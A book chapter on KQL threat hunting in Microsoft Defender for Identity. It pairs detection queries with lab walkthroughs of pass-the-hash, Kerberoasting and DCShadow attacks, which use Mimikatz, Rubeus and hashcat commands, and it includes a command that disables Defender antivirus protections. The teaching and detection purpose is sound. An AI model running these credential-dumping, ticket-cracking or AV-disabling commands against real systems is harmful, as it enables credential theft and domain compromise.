# Chapter 6: Mastering KQL for Advanced Threat Detection in MDI

## Example 1: Identifying NTLM and Kerberos Sign-ins
Monitoring the authentication protocols used in your environment is crucial for identifying potential security issues. NTLM (New Technology LAN Manager) is an older and less secure protocol compared to Kerberos. Therefore, understanding the ratio of NTLM to Kerberos sign-ins can highlight areas where security improvements are needed. Looking at the `IdentityLogonEvents` and summarizing the rows by Protocol gives us a hint if we need to change the authentication protocols in our environment.

```kql
IdentityLogonEvents
| where Application == "Active Directory"
| where Protocol in ("Ntlm”, "Kerberos")
| where ActionType == "LogonSuccess"
| summarize count() by Protocol
| render piechart
```

## Example 2: Monitoring Legacy Service Accounts
While Group Managed Service Accounts (gMSAs) are recommended, legacy service accounts still exist and can pose a security risk if not properly monitored. It’s crucial to track their activity to detect any unusual behavior.

```kql
IdentityLogonEvents
| where Application == "Active Directory"
| where AccountUpn == "your_svcaccount@domain.local" // Edit to your SVC account
| where ActionType == "LogonSuccess"
| summarize count() by DeviceName
```

## Example 3: Identifying All Service Accounts
If you’re unsure about all the service accounts in your environment, you can query the IdentityInfo table to get a comprehensive list.

```kql
IdentityInfo
| where SourceProvider == "ActiveDirectory"
| where Type == "ServiceAccount"
| summarize arg_max(AccountName,*) by Timestamp
| sort by Timestamp desc
```

## Example 4: Monitoring Multiple Service Accounts
To monitor multiple service accounts simultaneously, you can create a dynamic list of service accounts and use it in your query.

```kql
let srvcList = dynamic(["svc1@contoso.local","svc2@contoso.local","svc3@contoso.local"]);
IdentityLogonEvents
| where AccountUpn in~ (srvcList)
| summarize count() by AccountName, DeviceName, Protocol
```


Example 5: Ensuring Domain Controllers Are Not Used as File Servers
Using domain controllers as file servers can pose significant security risks. It’s essential to ensure that this practice is not happening in your environment.

```kql
IdentityDirectoryEvents
| where ActionType == "SMB file copy"
| extend ParsedFields=parse_json(AdditionalFields)
| extend FileName=tostring(ParsedFields.FileName), FilePath=tostring(ParsedFields.FilePath), Method=tostring(ParsedFields.Method)
| where Method == "Write"
| project Timestamp, ActionType, DeviceName, IPAddress, AccountDisplayName, DestinationDeviceName, DestinationPort, FileName, FilePath, Method
```

Example 6: Detecting Enumeration Attacks
Enumeration attacks can be detected by monitoring query events against your Active Directory. These attacks often involve using SAMR or LDAP queries to gather information about users and groups.

```kql
IdentityQueryEvents
| where Application == "Active Directory"
| where ActionType in ("SAMR", "LDAP")
| project Timestamp, ActionType, DeviceName, DestinationDeviceName, AccountDisplayName, QueryType, QueryTarget
```


## Real-World Case Studies: Detecting Advanced Attacks with KQL

Creating standard user accounts and service accounts
We’ll get started using the following steps:

1.	Define variables:

```powershell
$serviceAccountName = "svc_kerberoast"
$domain = "contoso.local"
$serviceAccountPassword = "P@ssw0rd!"  # Only used for lab purposes
$spn = "HTTP/webserver.contoso.local"
$ou = "OU=Service Accounts,DC=contoso,DC=local"  # Change this to the desired OU
```

2.	Import Active Directory module:
    
```powershell
Import-Module ActiveDirectory
```

3.	Create the service account:
    
```powershell
New-ADUser -Name $serviceAccountName -SamAccountName $serviceAccountName -UserPrincipalName "$serviceAccountName@$domain" -Path $ou -AccountPassword (ConvertTo-SecureString $serviceAccountPassword -AsPlainText -Force) -Enabled $true
```

4.	Set the SPN for the service account:
    
```powershell
Set-ADUser -Identity $serviceAccountName -ServicePrincipalNames @{Add=$spn}
```

5.	Verify the SPN:

```powershell
Get-ADUser -Identity $serviceAccountName -Property ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
```

### Disable MDE Antivirus Temporarily

1.	Type the following commands to disable MDE:

```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```

2.	Verify that the settings above are disabled with the command:

```powershell
Get-MpPreference
```

## Pass-the-Hash (PtH) Attack
### Steps to perform a PtH attack
The following steps will guide you through executing a PtH attack, which involves obtaining and using hashed credentials to authenticate within a network without needing plaintext passwords:

1.	Obtain NTLM Hashes
    - On a compromised machine, run Mimikatz to extract NTLM hashes.
    - Execute the following commands in Mimikatz.

    ```cmd
    privilege::debug
    sekurlsa::logonpasswords
    ```

    - Note the NTLM hash of a user account.

2.	Use NTLM Hash to Authenticate
    - Use the NTLM hash to authenticate to another machine in the network using Mimikatz.
    ```cmd
    sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash>
    ```

3.	Verify Access
    - A new command prompt opens with the privileges of the target user. Try accessing network resources to verify the attack.

### Detection
We can hunt for PtH and Mimikatz commands in the DeviceEvents table:

```kql
DeviceEvents
| extend AdditionalFieldsParsed = parse_json(AdditionalFields)
| extend Description = tostring(AdditionalFieldsParsed.Description)
| where Description has "sekurlsa::pth"
| project-reorder Timestamp, Description, InitiatingProcessFolderPath, InitiatingProcessAccountName
```

## Kerberoasting
### Steps to perform Kerberoasting
The following steps will demonstrate how to carry out a Kerberoasting attack, which involves requesting service tickets for service accounts and attempting to crack them offline to reveal plaintext passwords: 

1.	Enumerate Service Accounts with SPNs (Service Principal Names)
    - Use PowerShell to list service accounts with SPNs.

    ```powershell
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object SamAccountName, ServicePrincipalName
    ```

2.	Request service tickets (TGS) for these SPNs
    - Use `Rubeus` or `Invoke-Kerberoast` to request service tickets.

    ```cmd
    Invoke-Kerberoast -OutputFormat Hashcat
    Rubeus.exe kerberoast
    ```

3.	Extract and Crack Tickets
    - Extract the tickets and save them to a file.
    - Use a cracking tool like Hashcat to crack the hashes.

    ```cmd
    hashcat -m 13100 -a 0 <hash_file> <wordlist>
    ```

### Detection
As you can imagine, we do need many types of logs to be able to detect malicious events in our environment. Sending events from the security event log is crucial. And as you may see in your production environment there will be a lot of requests for service tickets, but to give you a start, here’s a detection you can start with:

```kql
SecurityEvent
| where EventID == 4769
| where AccountName !endswith "$" // Filter out service or machine accounts
| where ServiceName !endswith "$" // Filter out service accounts
| where TicketEncryptionType == "0x17" // Focus on tickets using RC4 encryption
| project TimeGenerated, AccountName, ServiceName, ClientAddress, TicketEncryptionType
```

## DCShadow Attack
### Steps to perform DCShadow attack
The following steps outline the process of performing a DCShadow attack, where an attacker registers a rogue domain controller and pushes malicious changes into the Active Directory through the replication process:

1.	Switch to `SYSTEM`
    - Run the following commands in Mimikatz. You will see in the output that you are running in SYSTEM context.

    ```cmd 
    privilege::debug
    token::elevate
    ```

2.	List all tokens and find the Domain Admin account’s token ID
    - Start listing all tokens and remember the ID of a Domain Admin account, we will use that ID later.
    
    ```cmd
    token::list
    ```

3.	Register a Rogue DC using Mimikatz
    - Use Mimikatz to register a rogue change in AD, in the example below we are changing the description of the object in AD.

    ```cmd
    lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=domain,DC=com /attribute:description /value:"DCShadow Test"
    ```

4.	Push Malicious Changes to AD
    - Pushing the changes to AD requires a replication, therefore we need to open a new Mimikatz command prompt as our compromised Domain Admin account. For example, push the description changes that we did earlier.

    ```cmd
    lsadump::dcshadow /push
    ```

### Detection
Due to the sophisticated nature of DCShadow, we may need to employ a variety of KQL queries to effectively monitor for signs of this attack. Below is an example that concentrates on tracking event logs for any unusual domain controller activities.

```kql
let startDateTime = ago(1d);
let endDateTime = now();
SecurityEvent
| where TimeGenerated between (startDateTime .. endDateTime)
| where EventID in (4742, 4662, 4929, 4931)
| where AccountName !contains "$" // Filtering out service accounts generally
| extend ObjectModified = tostring(TargetObject)
| where ObjectModified contains "CN=Domain Controllers"
| project TimeGenerated, EventID, AccountName, ComputerName, ObjectModified, Activity
| distinct TimeGenerated, AccountName, ComputerName, ObjectModified, EventID, Activity
```

## Further reading
- The Definitive Guide to KQL: Using Kusto Query Language for operations, defending, and threat hunting – https://aka.ms/KQLMSPress/Store  
